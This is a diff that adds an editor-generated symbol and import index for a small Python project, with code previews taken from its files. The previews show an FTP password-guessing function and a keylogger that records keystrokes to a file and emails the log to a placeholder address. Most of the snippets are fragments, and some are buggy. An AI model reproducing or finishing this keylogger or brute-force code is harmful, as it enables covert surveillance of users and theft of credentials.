@@ -1,0 +1,238 @@
+[
+    {
+        "label": "socket",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "socket",
+        "description": "socket",
+        "detail": "socket",
+        "documentation": {
+            "value": "\n```python\nimport socket\n```\n",
+            "supportThemeIcons": false
+        }
+    },
+    {
+        "label": "re",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "re",
+        "description": "re",
+        "detail": "re",
+        "documentation": {
+            "value": "\n```python\nimport re\n```\n",
+            "supportThemeIcons": false
+        }
+    },
+    {
+        "label": "sys",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "sys",
+        "description": "sys",
+        "detail": "sys",
+        "documentation": {
+            "value": "\n```python\nimport sys\n```\n",
+            "supportThemeIcons": false
+        }
+    },
+    {
+        "label": "sys,logging",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "sys.logging",
+        "description": "sys.logging",
+        "detail": "sys.logging",
+        "documentation": {
+            "value": "\n```python\nimport sys.logging\n```\n",
+            "supportThemeIcons": false
+        }
+    },
+    {
+        "label": "time,datetime",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "time.datetime",
+        "description": "time.datetime",
+        "detail": "time.datetime",
+        "documentation": {
+            "value": "\n```python\nimport time.datetime\n```\n",
+            "supportThemeIcons": false
+        }
+    },
+    {
+        "label": "Listener",
+        "importPath": "pynput.keyboard",
+        "description": "pynput.keyboard",
+        "isExtraImport": true,
+        "detail": "pynput.keyboard",
+        "documentation": {
+            "value": "\n```python\nimport pynput.keyboard\n```\n",
+            "supportThemeIcons": false
+        }
+    },
+    {
+        "label": "Listener",
+        "importPath": "pynput.keyboard",
+        "description": "pynput.keyboard",
+        "isExtraImport": true,
+        "detail": "pynput.keyboard",
+        "documentation": {
+            "value": "\n```python\nimport pynput.keyboard\n```\n",
+            "supportThemeIcons": false
+        }
+    },
+    {
+        "label": "setup",
+        "importPath": "setuptools",
+        "description": "setuptools",
+        "isExtraImport": true,
+        "detail": "setuptools",
+        "documentation": {
+            "value": "\n```python\nimport setuptools\n```\n",
+            "supportThemeIcons": false
+        }
+    },
+    {
+        "label": "Extension",
+        "importPath": "setuptools",
+        "description": "setuptools",
+        "isExtraImport": true,
+        "detail": "setuptools",
+        "documentation": {
+            "value": "\n```python\nimport setuptools\n```\n",
+            "supportThemeIcons": false
+        }
+    },
+    {
+        "label": "datetime",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "datetime",
+        "description": "datetime",
+        "detail": "datetime",
+        "documentation": {
+            "value": "\n```python\nimport datetime\n```\n",
+            "supportThemeIcons": false
+        }
+    },
+    {
+        "label": "nmap",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "nmap",
+        "description": "nmap",
+        "detail": "nmap",
+        "documentation": {
+            "value": "\n```python\nimport nmap\n```\n",
+            "supportThemeIcons": false
+        }
+    },
+    {
+        "label": "connection",
+        "kind": 2,
+        "importPath": "ftpcracker",
+        "description": "ftpcracker",
+        "peekOfCode": "def connection(ip,user,passw):\n    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n    print('Trying'+ ip + ':' + user + ':'+ passw)\n    sock.connect(('192.168.0.1',21))\n    data=sock.recv(1024)\n    sock.send('User' + user * '\\r\\n')\n    data=sock.recv(1024)\n    sock.send('Password' + passw * '\\r\\n')\n    data=sock.recv(1024)\n    sock.send('Quit'*'\\r\\n')",
+        "detail": "ftpcracker",
+        "documentation": {
+            "value": "\n```python\nfrom ftpcracker import connection\n```\n\n```python\n\n\n```\n\n```python\ndef connection(ip,user,passw):\n    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n    print('Trying'+ ip + ':' + user + ':'+ passw)\n    sock.connect(('192.168.0.1',21))\n    data=sock.recv(1024)\n    sock.send('User' + user * '\\r\\n')\n    data=sock.recv(1024)\n    sock.send('Password' + passw * '\\r\\n')\n    data=sock.recv(1024)\n    sock.send('Quit'*'\\r\\n')\n```\n",
+            "supportThemeIcons": false
+        }
+    },
+    {
+        "label": "TimeOut",
+        "kind": 2,
+        "importPath": "key",
+        "description": "key",
+        "peekOfCode": "def TimeOut():   \n    global timeout\n    if time.time()>timeout:       \n        timeout=time.time()+wait_seconds                           \n        #print(timeout)\n        return True\n    else:\n        return False\ndef SendEmail(user,pwd,recipient,subject,body):\n    import smtplib",
+        "detail": "key",
+        "documentation": {
+            "value": "\n```python\nfrom key import TimeOut\n```\n\n```python\n\n\n```\n\n```python\ndef TimeOut():   \n    global timeout\n    if time.time()>timeout:       \n        timeout=time.time()+wait_seconds                           \n        #print(timeout)\n        return True\n    else:\n        return False\ndef SendEmail(user,pwd,recipient,subject,body):\n    import smtplib\n```\n",
+            "supportThemeIcons": false
+        }
+    },
+    {
+        "label": "SendEmail",
+        "kind": 2,
+        "importPath": "key",
+        "description": "key",
+        "peekOfCode": "def SendEmail(user,pwd,recipient,subject,body):\n    import smtplib\n    gmail_user=user\n    gmail_pass=pwd\n    FROM= user\n    TO= recipient if type(recipient) is list else [recipient]\n    SUBJECT=subject\n    TEXT=body   \n    message=\"\"\"\\From: %s\\nTo: %s\\nSubject: %s\\n\\n%s\"\"\" % (FROM,\",\".join(TO),SUBJECT,TEXT)   \n    try:",
+        "detail": "key",
+        "documentation": {
+            "value": "\n```python\nfrom key import SendEmail\n```\n\n```python\n\n\n```\n\n```python\ndef SendEmail(user,pwd,recipient,subject,body):\n    import smtplib\n    gmail_user=user\n    gmail_pass=pwd\n    FROM= user\n    TO= recipient if type(recipient) is list else [recipient]\n    SUBJECT=subject\n    TEXT=body   \n    message=\"\"\"\\From: %s\\nTo: %s\\nSubject: %s\\n\\n%s\"\"\" % (FROM,\",\".join(TO),SUBJECT,TEXT)   \n    try:\n```\n",
+            "supportThemeIcons": false
+        }
+    },
+    {
+        "label": "FormatAndSendEmail",
+        "kind": 2,
+        "importPath": "key",
+        "description": "key",
+        "peekOfCode": "def FormatAndSendEmail():\n    with open('keylogger.txt','r+') as f:\n        actualdate=datetime.datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n        data=f.read().replace('\\n','')                \n        data='log capturado a las '+ actualdate + '\\n' + data        \n        SendEmail('ssssmail.com','password','ddddmail.com',\n                  'new log - '+actualdate,data)      \n        f.seek(0)\n        f.truncate()\ndef key_recorder(key):    ",
+        "detail": "key",
+        "documentation": {
+            "value": "\n```python\nfrom key import FormatAndSendEmail\n```\n\n```python\n\n\n```\n\n```python\ndef FormatAndSendEmail():\n    with open('keylogger.txt','r+') as f:\n        actualdate=datetime.datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n        data=f.read().replace('\\n','')                \n        data='log capturado a las '+ actualdate + '\\n' + data        \n        SendEmail('ssssmail.com','password','ddddmail.com',\n                  'new log - '+actualdate,data)      \n        f.seek(0)\n        f.truncate()\ndef key_recorder(key):    \n```\n",
+            "supportThemeIcons": false
+        }
+    },
+    {
+        "label": "key_recorder",
+        "kind": 2,
+        "importPath": "key",
+        "description": "key",
+        "peekOfCode": "def key_recorder(key):    \n    f=open('keylogger.txt','a')\n    keyo=str(key)\n    if keyo==\"Key.enter\":\n        f.write('\\n')\n    elif keyo==\"Key.space\": \n        f.write(\" \")\n    elif keyo ==\"Key.backspace\":       \n        #f.write(keyo.replace(keyo,\"\"))          \n        size=f.tell()    # the size... ",
+        "detail": "key",
+        "documentation": {
+            "value": "\n```python\nfrom key import key_recorder\n```\n\n```python\n\n\n```\n\n```python\ndef key_recorder(key):    \n    f=open('keylogger.txt','a')\n    keyo=str(key)\n    if keyo==\"Key.enter\":\n        f.write('\\n')\n    elif keyo==\"Key.space\": \n        f.write(\" \")\n    elif keyo ==\"Key.backspace\":       \n        #f.write(keyo.replace(keyo,\"\"))          \n        size=f.tell()    # the size... \n```\n",
+            "supportThemeIcons": false
+        }
+    },
+    {
+        "label": "classifiers",
+        "kind": 5,
+        "importPath": "setup",
+        "description": "setup",
+        "peekOfCode": "classifiers = \"\"\"\\\nDevelopment Status :: 5 - Production/Stable\nIntended Audience :: Developers\nLicense :: OSI Approved :: MIT License\nProgramming Language :: Python\nTopic :: System :: Monitoring\nTopic :: Software Development :: Libraries :: Python Modules\nOperating System :: Microsoft :: Windows\n\"\"\"\nfrom setuptools import setup, Extension",
+        "detail": "setup",
+        "documentation": {
+            "value": "\n```python\nfrom setup import classifiers\n```\n\n```python\n\n\n```\n\n```python\nclassifiers = \"\"\"\\\nDevelopment Status :: 5 - Production/Stable\nIntended Audience :: Developers\nLicense :: OSI Approved :: MIT License\nProgramming Language :: Python\nTopic :: System :: Monitoring\nTopic :: Software Development :: Libraries :: Python Modules\nOperating System :: Microsoft :: Windows\n\"\"\"\nfrom setuptools import setup, Extension\n```\n",
+            "supportThemeIcons": false
+        }
+    },
+    {
+        "label": "libs",
+        "kind": 5,
+        "importPath": "setup",
+        "description": "setup",
+        "peekOfCode": "libs = ['user32']\ndoclines = __doc__.split('\\n')\nsetup(name='pyHook',\n      version='1.5.1',\n      maintainer='Daniel Folkinshteyn',\n      maintainer_email='nanotube@users.sf.net',\n      author='Peter Parente',\n      author_email='parente@cs.unc.edu',\n      url='http://pyhook.sourceforge.net',\n      download_url='http://www.sourceforge.net/projects/pyhook',",
+        "detail": "setup",
+        "documentation": {
+            "value": "\n```python\nfrom setup import libs\n```\n\n```python\n\n\n```\n\n```python\nlibs = ['user32']\ndoclines = __doc__.split('\\n')\nsetup(name='pyHook',\n      version='1.5.1',\n      maintainer='Daniel Folkinshteyn',\n      maintainer_email='nanotube@users.sf.net',\n      author='Peter Parente',\n      author_email='parente@cs.unc.edu',\n      url='http://pyhook.sourceforge.net',\n      download_url='http://www.sourceforge.net/projects/pyhook',\n```\n",
+            "supportThemeIcons": false
+        }
+    },
+    {
+        "label": "doclines",
+        "kind": 5,
+        "importPath": "setup",
+        "description": "setup",
+        "peekOfCode": "doclines = __doc__.split('\\n')\nsetup(name='pyHook',\n      version='1.5.1',\n      maintainer='Daniel Folkinshteyn',\n      maintainer_email='nanotube@users.sf.net',\n      author='Peter Parente',\n      author_email='parente@cs.unc.edu',\n      url='http://pyhook.sourceforge.net',\n      download_url='http://www.sourceforge.net/projects/pyhook',\n      license='http://www.opensource.org/licenses/mit-license.php',",
+        "detail": "setup",
+        "documentation": {
+            "value": "\n```python\nfrom setup import doclines\n```\n\n```python\n\n\n```\n\n```python\ndoclines = __doc__.split('\\n')\nsetup(name='pyHook',\n      version='1.5.1',\n      maintainer='Daniel Folkinshteyn',\n      maintainer_email='nanotube@users.sf.net',\n      author='Peter Parente',\n      author_email='parente@cs.unc.edu',\n      url='http://pyhook.sourceforge.net',\n      download_url='http://www.sourceforge.net/projects/pyhook',\n      license='http://www.opensource.org/licenses/mit-license.php',\n```\n",
+            "supportThemeIcons": false
+        }
+    },
+    {
+        "label": "key_recorder",
+        "kind": 2,
+        "importPath": "simplekeyloger",
+        "description": "simplekeyloger",
+        "peekOfCode": "def key_recorder(key):    \n    f=open('keylogger.txt','a')\n    keyo=str(key)\n    if keyo==\"Key.enter\":\n        f.write('\\n')\n    elif keyo==\"Key.space\": \n        f.write(\" \")\n    elif keyo ==\"Key.backspace\":       \n        #f.write(keyo.replace(keyo,\"\"))          \n        size=f.tell()    # the size... ",
+        "detail": "simplekeyloger",
+        "documentation": {
+            "value": "\n```python\nfrom simplekeyloger import key_recorder\n```\n\n```python\n\n\n```\n\n```python\ndef key_recorder(key):    \n    f=open('keylogger.txt','a')\n    keyo=str(key)\n    if keyo==\"Key.enter\":\n        f.write('\\n')\n    elif keyo==\"Key.space\": \n        f.write(\" \")\n    elif keyo ==\"Key.backspace\":       \n        #f.write(keyo.replace(keyo,\"\"))          \n        size=f.tell()    # the size... \n```\n",
+            "supportThemeIcons": false
+        }
+    }
+]
